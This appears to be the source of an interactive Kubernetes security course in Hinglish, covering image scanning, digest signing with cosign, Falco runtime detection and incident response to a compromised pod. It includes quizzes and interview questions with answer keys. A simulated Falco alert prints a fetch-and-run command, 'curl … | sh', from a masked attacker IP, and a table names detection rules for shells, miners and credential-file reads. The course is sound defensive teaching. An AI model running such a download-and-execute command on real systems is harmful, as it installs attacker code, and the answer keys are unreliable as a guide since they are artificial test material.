          { re: /^cosign sign --key cosign\.key chaipay\/pay-api@sha256:9f2c41d7[0-9a-f]*$/, mutate: s => { s.cluster.signed = true; },
            out: 'Enter password for private key:\nPushing signature to: index.docker.io/chaipay/pay-api\n(signature registry mein image ke saath rakh diya gaya)' },
          { re: /^cosign sign --key cosign\.key chaipay\/pay-api:\S+$/, err: true,
            out: 'WARNING: Image reference uses a tag, not a digest, to identify the image to sign.\n    This can lead you to sign a different image than the intended one. Please use a\n    digest (example.com/ubuntu@sha256:abc123...) rather than tag (example.com/ubuntu:latest).\n(simulator ne roka: tag kal kisi aur image par ja sakta hai. Digest se sign karo: chaipay/pay-api@' + DIG + ')' },
          { re: /^cosign sign\b/, err: true, out: 'Roop: cosign sign --key cosign.key chaipay/pay-api@' + DIG + '\n(digest galat ho toh: crane digest ' + IMG_NEW + ')' },
          { re: /^cosign verify --key cosign\.pub chaipay\/pay-api(@sha256:9f2c41d7[0-9a-f]*|:4\.0\.1-slim)$/, mutate: s => { if (s.cluster.signed) s.cluster.sigOk = true; },
            out: s => s.cluster.signed
              ? 'Verification for index.docker.io/chaipay/pay-api@' + DIG_FULL + ' --\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - The signatures were verified against the specified public key\n(signature sahi hai: yeh image ChaiPay ki key se sign hui hai)'
              : 'Error: no matching signatures: no signatures found\n(is image par abhi koi signature nahi hai. Cluster ki policy is image ko chalne nahi degi.)' },
          { re: /^cosign verify --key cosign\.pub chaipay\/pay-api:4\.0\.1$/, out: 'Error: no matching signatures: no signatures found\n(purani image par signature nahi hai — aur hona bhi nahi chahiye: scan fail hua tha)' },
          { re: /^cosign verify\b/, err: true, out: 'Roop: cosign verify --key cosign.pub chaipay/pay-api@' + DIG },
          { re: /^(cosign|crane)\b/, err: true, out: 'Is mission mein: crane digest IMAGE · cosign sign --key cosign.key IMAGE@DIGEST · cosign verify --key cosign.pub IMAGE@DIGEST' },
        ],
        files: {
          'pay-api-digest.yaml': {
            desc: 'pay-api ka Deployment — image digest se likhi hai (slim image)',
            content: 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pay-api\n  namespace: payments\nspec:\n  template:\n    spec:\n      containers:\n        - name: pay-api\n          image: chaipay/pay-api@' + DIG_FULL + '\n          # tag nahi — digest. Yeh line hamesha isi ek image ko chalayegi.',
            apply: s => {
              const c = s.cluster;
              if (!c.signed) return 'Error from server: admission webhook "mutate.kyverno.svc-fail" denied the request:\n\nresource Deployment/payments/pay-api was blocked due to the following policies\n\nverify-image-signature:\n  check-chaipay-signature: \'failed to verify image index.docker.io/chaipay/pay-api@' + DIG + '…: .attestors[0].entries[0].keys: no signatures found\'\n(policy ne roka: image par signature nahi hai. Pehle cosign sign.)';
              if (c.deployed) return 'deployment.apps/pay-api unchanged';
              c.deployed = true;
              c.pods = [{ name: 'pay-api-9a8b7c-s1', ready: '1/1', status: 'Running', restarts: 0, age: '15s', node: 'node-1', ip: '10.244.1.41' }];
              return 'deployment.apps/pay-api configured\n(policy ne signature jaancha → sahi. Naya pod slim image par Running hai.)';
            },
          },
          'pay-api-old-tag.yaml': {
            desc: 'pay-api ka Deployment — image: chaipay/pay-api:4.0.1 (purani debian wali)',
            apply: () => 'Error from server: admission webhook "mutate.kyverno.svc-fail" denied the request:\n\nresource Deployment/payments/pay-api was blocked due to the following policies\n\nverify-image-signature:\n  check-chaipay-signature: \'failed to verify image index.docker.io/chaipay/pay-api:4.0.1: no signatures found\'\n(purani image par signature nahi hai, isliye policy ne roka. Aur achha hua: is image mein 2 CRITICAL kamzoriyan hain.)',
          },
          'cosign.pub': { desc: 'ChaiPay ki public key (signature jaanchne ke liye)', content: '-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE…(misaal)…\n-----END PUBLIC KEY-----',
            apply: () => 'error: yeh ek key file hai, Kubernetes manifest nahi. Iska istemal: cosign verify --key cosign.pub IMAGE' },
        },
        success: KG.allOf(T_SUPPLY),
        successText: `Teen khatre, teen jawab: <b>scan</b> ne purani image ki 2 CRITICAL kamzoriyan pakdi (sab base image mein). <b>Digest</b> ne pakka kiya ki sign aur deploy ek hi image par hue. <b>Signature</b> ne cluster ke darwaze par saabit kiya ki image ChaiPay ki pipeline se aayi hai.
          <b>Yaad rakho:</b> kram scan → sign hai. Sign → scan nahi. Signature ka matlab "yeh image jaanchi hui hai" tabhi hai jab jaanch pehle hui ho.`,
        hints: [
          `trivy image ${IMG_OLD} aur trivy image ${IMG_NEW} — dono ke "Total" milao.`,
          `crane digest ${IMG_NEW} se digest nikaalo. Phir: cosign sign --key cosign.key chaipay/pay-api@${DIG}`,
          `cosign verify --key cosign.pub chaipay/pay-api@${DIG}, phir kubectl apply -f pay-api-digest.yaml`,
        ],
        solution: [
          `trivy image ${IMG_OLD}`,
          `trivy image ${IMG_NEW}`,
          `crane digest ${IMG_NEW}`,
          `cosign sign --key cosign.key chaipay/pay-api@${DIG}`,
          `cosign verify --key cosign.pub chaipay/pay-api@${DIG}`,
          'kubectl apply -f pay-api-digest.yaml',
        ],
      },
      {
        type: 'quiz',
        title: 'Pakka karo — tag, digest, SBOM',
        questions: [
          {
            q: 'Deployment mein image: chaipay/notify:2.3 likha hai. Kal kisi ne registry mein 2.3 tag ko ek nayi image par chipka diya. Agle pod restart par kya chalega?',
            choices: [
              'Purani image — Kubernetes tag ko pehli baar ke digest se yaad rakhta hai',
              'Nayi image — registry mein tag ab nayi image ki taraf ishaara karta hai',
              'Kuch nahi — Kubernetes badle hue tag ko pehchaan kar pod rok deta hai',
              'Dono — aadhe pods purani image par aur aadhe nayi par, hamesha ke liye',
            ],
            answer: 1,
            explain: 'Tag sirf ek chit hai. Naya node (ya imagePullPolicy: Always) tag ko dobara registry se poochhta hai aur nayi image le aata hai. Isi liye ek hi Deployment ke pods alag-alag code chala sakte hain. Digest se likhne par yeh mumkin nahi.',
          },
          {
            q: 'Kal ek nayi badi kamzori ka elaan hota hai: library "libxyz" ke version 2.1 se 2.4 mein. Tumhari 140 images hain. Sabse tez tareeka yeh jaanne ka ki kaun si images mein woh library hai?',
            choices: [
              'Har image ko ek-ek karke chala kar andar dekhna',
              'Har team ko email karke poochhna ki unki image mein libxyz hai ya nahi',
              'Har image ke SBOM (packages ki list) mein libxyz ko search karna',
              'Saari 140 images ko dobara build kar dena, zaroorat ho ya na ho',
            ],
            answer: 2,
            explain: 'SBOM = image ke andar ke saare packages aur versions ki list, build ke waqt bani hui. Nayi kamzori par sawal "kahan-kahan hai?" ka jawab SBOM search se minuton mein milta hai. Bina SBOM ke 140 images dobara scan karni padti hain.',
          },
        ],
      },
    ],
    interview: {
      title: 'Interview Round — supply chain',
      instructions: 'Pichhle kuch saalon ke bade hamle isi raaste se hue, isliye yeh sawal aam hai. 🎤',
      questions: [
        {
          q: '"Production mein image ko tag se likhna chahiye ya digest se? Kyun?"',
          choices: [
            'Tag se — tag padhne mein aasaan hai aur Kubernetes tag ko khud lock kar deta hai',
            'Digest se — tag kisi bhi nayi image par ja sakta hai; digest hamesha ek hi image hai',
            'latest tag se — taaki har restart par sabse nayi security patch apne aap aa jaye',
            'Farak nahi padta — dono registry mein ek hi cheez ke do naam hain',
          ],
          answer: 1,
          explain: 'Digest image ke maal ka hash hai. Digest se likhne par: jo scan hua, jo sign hua aur jo chal raha hai — teeno pakka ek hi image hain. Aur rollback mein pata hota hai ki kaun sa maal wapas aa raha hai.',
        },
        {
          q: '"Image signing se kya milta hai jo scanning se nahi milta?"',
          choices: [
            'Signing image ko chhota kar deti hai, jisse pull tez hota hai',
            'Signing image ki kamzoriyon ko apne aap patch kar deti hai',
            'Signing saabit karti hai ki image tumhari pipeline se aayi hai aur raaste mein badli nahi',
            'Signing ke baad scan ki zaroorat nahi rehti kyunki signed image hamesha surakshit hoti hai',
          ],
          answer: 2,
          explain: 'Scan batata hai "is image mein kya kamzori hai". Signature batata hai "yeh image kahan se aayi aur badli nahi". Dono alag sawal hain. Signed image mein bhi kamzori ho sakti hai — isliye kram scan → sign.',
        },
        {
          q: '"Trivy ne 40 kamzoriyan dikhayi. Sab ko aaj hi theek karna mumkin nahi. Kaise chunoge?"',
          choices: [
            'CVE number ke kram mein, sabse purani pehle',
            'Jinka fix maujood hai aur severity CRITICAL/HIGH hai, unhe pehle',
            'Sab ko nazarandaz karunga jab tak koi hamla na ho',
            'Sirf apne code ki kamzoriyan; base image ki kamzoriyan meri zimmedari nahi',
          ],
          answer: 1,
          explain: 'Do filter: severity (CRITICAL/HIGH) aur fix maujood hai ya nahi (--ignore-unfixed). Jiska fix hi nahi, us par aaj kuch nahi ho sakta. Aur sabse bada asar base image badalne se aata hai: slim/distroless par aksar 80–90% kamzoriyan gayab ho jaati hain.',
        },
      ],
    },
    success: [
      'Main Trivy ka output padh kar bata sakta hoon ki kamzori kahan hai aur kise pehle theek karna hai',
      'Main tag aur digest ka farak samjha sakta hoon',
      'Main image ko digest se sign aur verify kar sakta hoon',
    ],
    homework: `<p>Apne laptop par (Trivy install ho toh) apni kisi image ko scan karo:</p>
      <pre>trivy image --severity HIGH,CRITICAL --ignore-unfixed &lt;image&gt;
trivy image --format cyclonedx -o sbom.json &lt;image&gt;      # SBOM
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\\n"}{end}' | sort -u
# upar ki list mein kitni images tag se hain, kitni digest se?</pre>`,
    cards: [
      { front: 'Tag aur digest ka farak?', back: '<b>Tag</b> (<code>:4.0.1</code>) ek chit hai jo kisi nayi image par ja sakti hai. <b>Digest</b> (<code>@sha256:…</code>) image ke maal ka fingerprint hai — badal nahi sakta.' },
      { front: 'Pipeline mein scan aur sign ka kram?', back: 'Scan <b>pehle</b>, sign <b>baad mein</b>. Signature ka matlab "jaanchi hui image" tabhi hai jab jaanch pehle hui ho.' },
      { front: 'cosign se sign aur verify?', back: '<code>cosign sign --key cosign.key IMAGE@DIGEST</code> · <code>cosign verify --key cosign.pub IMAGE@DIGEST</code>' },
      { front: 'Kamzoriyan ghatane ka sabse sasta tareeka?', back: 'Chhoti base image (distroless / slim). Jo package image mein nahi, usme kamzori nahi.' },
      { front: 'SBOM kya hai aur kab kaam aata hai?', back: 'Image ke saare packages + versions ki list. Nayi kamzori nikle toh "meri kaun si images mein hai?" ka jawab minuton mein.' },
    ],
  },

  /* ================================================================== */
  {
    id: 'sec-runtime',
    icon: '🦅',
    title: 'Runtime Security — Falco, aur compromise hue pod ka sahi jawab',
    badge: 'Runtime Rakshak',
    objectives: [
      'Kubernetes ko <b>behaviour</b> nahi dikhta — sirf "container chal raha hai"',
      'Falco: kernel ke syscalls se ajeeb harkat pakadna',
      'Compromise hue pod ka jawab: <b>alag karo → saboot → raaz badlo → wajah band karo → hatao</b>',
      'Falco ke alerts padhna + ghatna ke faisle sahi kram mein lena',
    ],
    lesson: [
      `<h3>📹 Misaal: bank ka CCTV</h3>
       <p>Bank ke darwaze par guard hai (admission policy). Tijori par taala hai (RBAC). Phir bhi bank <b>CCTV</b> lagata hai. Kyun?</p>
       <p>Kyunki koi andar aa hi gaya toh guard aur taala kuch nahi batate. CCTV batata hai ki <b>andar kya ho raha hai</b>.</p>
       <p>Kubernetes ko ek pod ke baare mein bas itna pata hota hai:</p>
       <ul>
         <li>Container chal raha hai? ✅</li>
         <li>Probes paas ho rahe hain? ✅</li>
       </ul>
       <p>Agar attacker usi container ke andar ek crypto miner chala de, toh dono jawab ab bhi ✅ hain. Pod <code>Running</code>, <code>1/1 Ready</code>.</p>
       <p><b>Asli baat:</b> "healthy" aur "surakshit" alag cheezein hain. Andar ki harkat dekhne ke liye alag auzaar chahiye: <b>runtime detection</b>.</p>`,
      `<h3>🦅 Falco: kernel se sunna</h3>
       <p>Container jo bhi kare — file kholna, network connection, naya process — kernel se <b>syscall</b> ke zariye karta hai.
       <b>Falco</b> har node par chalta hai aur in syscalls ko sunta hai (eBPF se). Falco ke <b>rules</b> batate hain kya ajeeb hai:</p>
       <table>
         <tr><th>Falco ka rule</th><th>Kyun ajeeb</th></tr>
         <tr><td>Terminal shell in container</td><td>Production container mein koi shell kyun khol raha hai?</td></tr>
         <tr><td>Write below binary dir (<code>/usr/bin</code>…)</td><td>Chalta container naye program kyun likh raha hai?</td></tr>
         <tr><td>Outbound connection to mining pool port</td><td>notify ko mining pool se kya kaam?</td></tr>
         <tr><td>Read sensitive file (<code>/etc/shadow</code>)</td><td>App ko password file kyun chahiye?</td></tr>
       </table>
       <p>Falco sirf <b>batata</b> hai. Falco kuch rokta nahi.</p>`,
      `<h3>🧯 Compromise hua pod: paanch kadam, isi kram mein</h3>
       <ol>
         <li><b>Alag karo</b> — pod ko zinda rakho, par traffic aur network se kaat do:
           <pre>kubectl label pod POD app- quarantine=true     # Service aur ReplicaSet se bahar
kubectl apply -f quarantine-netpol.yaml         # quarantine=true ka saara network band</pre></li>
         <li><b>Saboot bachao</b> — logs, <code>describe</code>, pod ka YAML.</li>
         <li><b>Raaz badlo</b> — us pod ka token jo-jo padh sakta tha, sab rotate karo.</li>
         <li><b>Wajah band karo</b> — kamzor image ko patch karo.</li>
         <li><b>Ab hatao</b> — quarantine pod ko delete karo.</li>
       </ol>
       <p><b>Sabse aam galti:</b> pod ko <b>turant delete</b> kar dena. Teen nuksaan: saboot gaya, attacker kaise aaya pata nahi chala,
       aur Deployment ne wahi kamzor image ka naya pod bana diya — attacker 5 minute mein wapas.</p>`,
    ],
    stages: [
      {
        type: 'triage',
        title: '🩺 Case: raat 2:14 ke teen alert',
        instructions: 'Commands chuno. Har command asli output deta hai. Saare clue milne par sawal khulega.',
        symptom: `Slack ke <code>#security</code> channel mein Falco ke <b>3 alert</b> aaye hain, sab <code>notify-5c9d4f-k3</code> pod se, raat 2:14 par.<br>
          Monitoring dashboard par sab hara hai: pod <code>Running</code>, <code>1/1 Ready</code>, koi restart nahi.`,
        commands: [
          { cmd: 'kubectl logs -n falco ds/falco | grep notify-5c9d4f-k3', clue: true,
            out: '02:14:07 Notice  A shell was spawned in a container with an attached terminal\n         (user=root container=notify shell=sh parent=node cmdline=sh -c "curl -s http://185.220.x.x/a.sh | sh")\n02:14:09 Error   File below a known binary directory opened for writing\n         (file=/usr/bin/kworkerd container=notify)\n02:14:15 Warning Outbound connection to common miner pool port\n         (dest=185.220.x.x:3333 proc=kworkerd container=notify)',
            note: 'Teeno alert ek kahani hain: (1) notify ke Node process ne ek shell chalaya jisne bahar se script utaari, (2) script ne <code>/usr/bin/kworkerd</code> naam ka program likha, (3) woh program mining pool ke port 3333 se jud gaya.' },
          { cmd: 'kubectl top pod notify-5c9d4f-k3', clue: true,
            out: 'NAME               CPU(cores)   MEMORY(bytes)\nnotify-5c9d4f-k3   1980m        310Mi',
            note: 'notify ka aam CPU ~150m hai. Abhi <b>1980m</b> — lagbhag 2 poore core. Crypto miner yahi karta hai: jitna CPU mile, sab kha jaata hai.' },
          { cmd: 'trivy image --severity CRITICAL chaipay/notify:2.3.0', clue: true,
            out: 'chaipay/notify:2.3.0 (node-pkg)\nTotal: 1 (CRITICAL: 1)\n\n│ Library       │ Severity │ Installed │ Fixed │ Title                                       │\n│ tmpl-renderer │ CRITICAL │ 4.1.2     │ 4.1.5 │ Remote code execution via crafted template  │',
            note: 'Ghusne ka raasta: notify ki template library mein <b>remote code execution</b> ki kamzori. Fix maujood hai (4.1.5), par image 2.3.0 mein purana version hai.' },
          { cmd: 'kubectl get pod notify-5c9d4f-k3', clue: false,
            out: 'NAME               READY   STATUS    RESTARTS   AGE\nnotify-5c9d4f-k3   1/1     Running   0          6d',
            note: 'Kubernetes ke hisaab se sab theek: Running, Ready, 0 restart. Kubernetes behaviour nahi dekhta.' },
          { cmd: 'kubectl get events --field-selector involvedObject.name=notify-5c9d4f-k3', clue: false,
            out: 'No resources found in payments namespace.',
            note: 'Koi event nahi. Attacker ne pod ko crash nahi kiya, isliye Kubernetes ke paas batane ko kuch nahi.' },
        ],
        questions: [
          {
            q: 'Kya hua hai?',
            choices: [
              'notify mein memory leak hai; isi wajah se CPU badh gaya aur Falco ne galat alert diya',
              'Attacker ne notify ki library ki kamzori se pod mein command chalaya aur crypto miner laga diya',
              'Kisi developer ne debug ke liye kubectl exec kiya; teeno alert usi ke hain',
              'Node par disk bhar gayi; kworkerd Linux ka apna process hai jo disk saaf kar raha hai',
            ],
            answer: 1,
            explain: 'Shell ka parent <code>node</code> (app ka process) hai, kubectl exec nahi. Script bahar ke IP se aayi. Naya binary likha gaya aur port 3333 (mining) par connection bana. CPU 13 guna. Yeh debug nahi, hamla hai.',
          },
          {
            q: 'Kubernetes ka dashboard hara kyun tha?',
            choices: [
              'Kyunki Kubernetes sirf container ka chalna aur probes dekhta hai',
              'Kyunki attacker ne Kubernetes ke events ko mita diya tha',
              'Kyunki Falco ne pod ko pehle hi theek kar diya tha',
              'Kyunki metrics-server band tha aur CPU ka number aaya hi nahi',
            ],
            answer: 0,
            explain: 'Liveness/readiness probes app ki sehat dekhte hain, suraksha nahi. Miner ke saath bhi notify SMS bhej raha tha. Isi liye runtime detection ek alag deewar hai.',
          },
        ],
      },
      {
        type: 'incident',
        title: '🚨 Compromise hua pod — har mod par ek faisla',
        pager: '<b>Falco: 3 alerts</b> — pod <code>notify-5c9d4f-k3</code>, namespace <code>payments</code><br>Shell + naya binary + mining pool se connection. Raat 2:14.',
        start: 'n1',
        nodes: {
          n1: {
            sitrep: 'notify-5c9d4f-k3   1/1   Running   CPU 1980m\nDeployment notify: replicas 1, image chaipay/notify:2.3.0',
            text: 'Attacker pod ke andar hai. Pehla kadam?',
            choices: [
              { t: 'kubectl delete pod notify-5c9d4f-k3 — attacker ko turant bahar nikaalo', good: false, explain: 'Saboot gaya. Aur Deployment wahi kamzor image ka naya pod banayega — attacker usi raaste se 5 minute mein wapas. Tumhe yeh bhi nahi pata chalega ki woh kya le gaya.' },
              { t: 'Pod ko zinda rakho, par alag karo: label hatao aur network kaat do', good: true, next: 'n2', explain: 'Alag karna (quarantine) dono kaam karta hai: attacker ka kaam rukta hai, aur saboot zinda rehta hai. Label hatne par ReplicaSet ek naya pod bana deta hai, toh notify chalta rehta hai.' },
              { t: 'Kuch mat karo; subah security team ke aane ka intezaar karo', good: false, explain: 'Attacker ke paas notify ka token aur network hai. Har minute woh aur aage ja sakta hai (Secrets, doosre pods). Alag karna abhi ka kaam hai.' },
            ],
          },
          n2: {
            sitrep: '$ kubectl label pod notify-5c9d4f-k3 app- quarantine=true\n$ kubectl apply -f quarantine-netpol.yaml\n\nnotify-5c9d4f-k3   quarantine=true   (Service se bahar, network band)\nnotify-5c9d4f-n9   app=notify        (ReplicaSet ka naya pod — wahi image 2.3.0)',
            text: 'Pod alag ho gaya. Ab?',
            choices: [
              { t: 'Saboot ikattha karo, phir dekho ki notify ka token kya-kya padh sakta tha', good: true, next: 'n3', explain: 'Do sawal: "kaise aaya" (saboot) aur "kya le gaya hoga" (token ki ijaazat). Doosre sawal ka jawab: kubectl auth can-i --list --as=system:serviceaccount:payments:notify-sa' },
              { t: 'Ab kaam ho gaya — pod alag hai, baaki subah dekhenge', good: false, explain: 'Do cheezein bachi hain jo intezaar nahi kar sakti: attacker jo raaz padh chuka hai, aur naya pod jo usi kamzor image par chal raha hai.' },
              { t: 'Quarantine pod ke andar kubectl exec karke miner process ko maar do', good: false, explain: 'Tum saboot ko badal rahe ho, aur attacker ke banaye mahaul mein command chala rahe ho. Pod pehle hi network se kata hai — miner ab kuch nahi kar sakta.' },
            ],
          },
          n3: {
            sitrep: '$ kubectl auth can-i --list --as=system:serviceaccount:payments:notify-sa\nsecrets      [sms-provider-key]   [get]\nconfigmaps   [notify-templates]   [get]',
            text: 'notify ka token ek Secret padh sakta tha: sms-provider-key. Kya karoge?',
            choices: [
              { t: 'Kuch nahi — attacker sirf miner chala raha tha, use Secret mein dilchaspi nahi hogi', good: false, explain: 'Tum attacker ka irada nahi jaante. Niyam: jo raaz attacker padh SAKTA tha, use padha hua maano.' },
              { t: 'sms-provider-key ko rotate karo: provider se nayi key lo aur purani ko band karo', good: true, next: 'n4', explain: 'Yahan least privilege ka faayda dikhta hai: sirf EK key badalni hai. Agar notify-sa ke paas "sab kuch" hota, toh payments ke saare raaz badalne padte.' },
              { t: 'Poore cluster ke saare Secrets rotate karo, ehtiyaat ke taur par', good: false, explain: 'Token ki ijaazat saaf dikh rahi hai: sirf ek Secret. Sab kuch rotate karna ghanton ka kaam aur naya khatra hai — bina kisi faayde ke.' },
            ],
          },
          n4: {
            sitrep: 'sms-provider-key: rotated ✓\nnotify-5c9d4f-n9 (naya pod): image chaipay/notify:2.3.0  ← wahi kamzori',
            text: 'Raaz badal gaya. Naya notify pod abhi bhi kamzor image par hai. Aakhri kadam?',
            choices: [
              { t: 'notify ko patched image (2.3.1) par deploy karo; phir quarantine pod delete karo', good: true, next: 'end', explain: 'Wajah band (patched image), phir safai (quarantine pod delete — saboot pehle hi ikattha ho chuka hai). Yahi kram hai.' },
              { t: 'Quarantine pod ko delete karo; image baad mein kisi din patch kar lenge', good: false, explain: 'Naya pod usi darwaze ke saath khada hai jisse attacker aaya tha. Wahi hamla dobara hoga.' },
              { t: 'notify Deployment ko 0 replicas par kar do aur wahin chhod do', good: false, explain: 'Hamla ruk jayega, par ChaiPay ke SMS bhi. Fix maujood hai (2.3.1) — service band karna aakhri raasta hai, pehla nahi.' },
            ],
          },
          end: {
            end: true,
            text: 'Ghatna sambhal gayi',
            summary: '<b>Paanch kadam, isi kram mein:</b> (1) <b>alag karo</b> — delete nahi. (2) <b>saboot</b> + "token kya padh sakta tha". (3) <b>raaz badlo</b> — jo padha ja sakta tha, use padha hua maano. (4) <b>wajah band</b> — patched image. (5) <b>ab hatao</b>.<br><br>Aur dekho pehle ke levels ne kya bachaya: <b>least privilege</b> ki wajah se sirf ek key badalni padi. <b>Image scan</b> CI mein hota toh 2.3.0 release hi nahi hoti.',
          },
        },
      },
    ],
    interview: {
      title: 'Interview Round — detection aur response',
      instructions: 'Interviewer dekhega ki tum ghabrahat mein pod delete karte ho ya sochte ho. 🎤',
      questions: [
        {
          q: '"Admission policy aur image scanning hai. Phir runtime detection (Falco) kyun?"',
          choices: [
            'Falco admission policy se tez hai, isliye policy ki jagah le sakta hai',
            'Policy aur scan darwaze par hain; chalte container ki harkat sirf runtime detection dekhta hai',
            'Falco images ko scan karta hai, isliye Trivy ki zaroorat nahi rehti',
            'Runtime detection sirf compliance ke kaagaz ke liye hota hai; asal mein kuch nahi pakadta',
          ],
          answer: 1,
          explain: 'Scan sirf jaani hui kamzoriyan pakadta hai; policy sirf object ka roop dekhti hai. Nayi (zero-day) kamzori, chori hue credentials, ya andar ka galat istemal — in sab mein image "saaf" aur YAML "sahi" hota hai. Tab sirf behaviour bacha hai.',
        },
        {
          q: '"Ek pod compromise ho gaya. Tum use turant delete kyun nahi karte?"',
          choices: [
            'Kyunki delete karne par Kubernetes poore namespace ko bhi delete kar deta hai',
            'Kyunki saboot chala jaata hai aur Deployment wahi kamzor image ka naya pod bana deta hai',
            'Kyunki compromise hua pod delete ho hi nahi sakta jab tak attacker andar hai',
            'Kyunki delete karne se pod ka ServiceAccount bhi delete ho jaata hai',
          ],
          answer: 1,
          explain: 'Delete = saboot khatam + wajah zinda. Sahi kram: alag karo (label + NetworkPolicy), saboot lo, raaz badlo, image patch karo, phir delete.',
        },
        {
          q: '"Pod ko \'alag karna\' (quarantine) Kubernetes mein kaise karte ho?"',
          choices: [
            'Node ko cordon karke — cordon se us node ke saare pods ka network band ho jaata hai',
            'Pod ke Deployment ko 0 replicas par scale karke',
            'Pod ka label badal kar aur us label par deny-all NetworkPolicy lagakar',
            'Pod ko kubectl exec se andar jaakar network interface band karke',
          ],
          answer: 2,
          explain: 'Label hatne se pod Service ke Endpoints se nikal jaata hai (traffic band) aur ReplicaSet use apna nahi maanta (naya pod banata hai, service chalti rehti hai). NetworkPolicy us pod ka andar-bahar ka saara network kaat deti hai. Pod zinda rehta hai — saboot ke liye.',
        },
      ],
    },
    success: [
      'Main bata sakta hoon ki Kubernetes ko kya dikhta hai aur kya nahi',
      'Main Falco ke alerts padh kar hamle ki kahani jod sakta hoon',
      'Main compromise hue pod ka jawab sahi kram mein de sakta hoon',
    ],
    homework: `<p>Apne cluster ke liye ek chhoti si "ghatna ki parchi" likho aur kahin chipka do:</p>
      <pre>1. ALAG:   kubectl label pod &lt;pod&gt; app- quarantine=true
           kubectl apply -f quarantine-netpol.yaml
2. SABOOT: kubectl logs &lt;pod&gt; &gt; logs.txt ; kubectl get pod &lt;pod&gt; -o yaml &gt; pod.yaml
3. RAAZ:   kubectl auth can-i --list --as=system:serviceaccount:&lt;ns&gt;:&lt;sa&gt;   → rotate
4. WAJAH:  patched image deploy
5. HATAO:  kubectl delete pod &lt;pod&gt;</pre>`,
    cards: [
      /* (boss level is file ke aakhir mein alag registerLevels call mein hai) */
      { front: 'Kubernetes ko pod ke baare mein kya dikhta hai, aur kya nahi?', back: 'Dikhta hai: container chal raha hai, probes paas. Nahi dikhta: andar ki harkat (shell, miner, bahar ke connection).' },
      { front: 'Falco kya sunta hai, aur kya karta hai?', back: 'Har node par kernel ke <b>syscalls</b> (eBPF se). Rules se milakar <b>alert</b> bhejta hai. Falco rokta nahi.' },
      { front: 'Compromise hue pod ke 5 kadam?', back: 'Alag karo → saboot → raaz badlo → wajah band (patch) → ab hatao.' },
      { front: 'Pod ko quarantine karne ke do commands?', back: '<code>kubectl label pod POD app- quarantine=true</code> + <code>quarantine=true</code> par deny-all NetworkPolicy.' },
      { front: 'Compromise hue pod ko turant delete kyun nahi?', back: 'Saboot gaya, aur Deployment wahi kamzor image ka naya pod bana deta hai — attacker wapas.' },
    ],
  },
]);

/* ------------------------------------------------------------------ */
/* LEVEL 5 — BOSS                                                      */
/* ------------------------------------------------------------------ */
VISUALS['sec-boss'] = {
  t: 'Chaar deewarein — attacker ko har padav par kya rokta hai',
  scene: {
    intro: 'Is track ki chaar deewarein ek hi hamle ke raaste par khadi hain. Dekho attacker har deewar par kahan atakta hai.',
    aria: 'chaar suraksha deewarein: image ki jaanch, admission policy, least privilege, runtime detection — 5 kadam',
    nodes: [
      { id: 'bad', col: 0, row: 0, icon: '🦹', label: 'Attacker', sub: 'bahar se', tone: 'bad' },
      { id: 'img', col: 1, row: 0, icon: '📦', label: 'Image ki jaanch', sub: 'scan + signature', tone: 'gold', about: 'Deewar 1. Jaani hui kamzori wali image release hi na ho; bahar ki image chale hi na.' },
      { id: 'pol', col: 2, row: 0, icon: '🛂', label: 'Admission policy', sub: 'root / privileged mana', tone: 'gold', about: 'Deewar 2. Pod ka roop: root nahi, privileged nahi, latest nahi. Attacker andar aa bhi jaye toh container se node tak pahunchna mushkil.' },
      { id: 'rbac', col: 2, row: 1, icon: '🪪', label: 'Least privilege', sub: 'token ki chhoti ijaazat', tone: 'gold', about: 'Deewar 3. Pod ka token sirf wahi kar sake jo app ko chahiye. NetworkPolicy se pod sirf wahin pahunche jahan zaroori hai.' },
      { id: 'rt', col: 1, row: 1, icon: '🦅', label: 'Runtime nazar', sub: 'Falco + jawab', tone: 'accent', about: 'Deewar 4. Jo teen deewarein paar kar gaya, uski harkat pakadna aur sahi kram mein jawab dena.' },
      { id: 'data', col: 0, row: 1, icon: '🗝️', label: 'Asli maal', sub: 'Secrets, database', tone: 'good', about: 'Attacker ka asli nishana: passwords, keys, customers ka data.' },
    ],
    steps: [
      { from: 'bad', to: 'img', label: 'kamzor library', tone: 'bad', say: '<b>Attacker</b> ek jaani hui kamzori dhoondhta hai. <b>Image ki jaanch</b> (scan CI mein, signature darwaze par) is kamzori wali image ko release hone se rokti. Yeh deewar kamzor ho toh attacker pod ke andar aa jaata hai.' },
      { from: 'img', to: 'pol', label: 'pod ke andar', tone: 'bad', say: 'Attacker pod ke andar hai. <b>Admission policy</b> ne pehle hi tay kar diya tha ki pod root nahi chalega aur privileged nahi hoga. Isliye attacker container se node tak nahi kood sakta.' },
      { from: 'pol', to: 'rbac', label: 'token churaya', tone: 'bad', say: 'Attacker pod ka token churata hai. <b>Least privilege</b> ki wajah se token sirf ek ConfigMap aur ek Secret padh sakta hai. NetworkPolicy ki wajah se pod database tak pahunch hi nahi sakta.' },
      { from: 'rbac', to: 'rt', label: 'ajeeb harkat', tone: 'bad', say: 'Attacker miner chalata hai. <b>Runtime nazar</b> (Falco) shell, naya binary aur mining pool ka connection pakad leti hai. On-call ko page milta hai.' },
      { from: 'rt', to: 'data', label: 'bach gaya', tone: 'good', say: 'Tumhara jawab — alag karo, saboot, raaz badlo, patch, hatao — attacker ko <b>Asli maal</b> tak pahunchne se pehle rok deta hai. Koi ek deewar poori nahi hoti. Chaaron milkar attacker ka kaam mehenga aur shor-sharaabe wala bana deti hain.' },
    ],
  },
};

const QP = 'notify-5c9d4f-k3';
const T_SECBOSS = [
  { text: 'Pehle <b>saboot</b> ikattha karo (<code>bash collect-evidence.sh</code>)', check: s => !!s.cluster.evidence },
  { text: `Pod <code>${QP}</code> ko Service aur ReplicaSet se <b>alag</b> karo (label <code>app-</code> aur <code>quarantine=true</code>)`, check: s => !!s.cluster.isolated },
  { text: 'Alag kiye pod ka <b>network kaato</b> (NetworkPolicy)', check: s => !!s.cluster.netpol && !!s.cluster.isolated },
  { text: 'Dekho notify ka token kya-kya padh sakta tha (<code>kubectl auth can-i --list --as=…</code>)', check: s => !!s.cluster.sawAccess },
  { text: 'Jo raaz padha ja sakta tha, use <b>badlo</b>', check: s => !!s.cluster.rotated },
  { text: '<b>Wajah band karo</b>: notify ko patched image par le jao', check: s => !!s.cluster.patched },
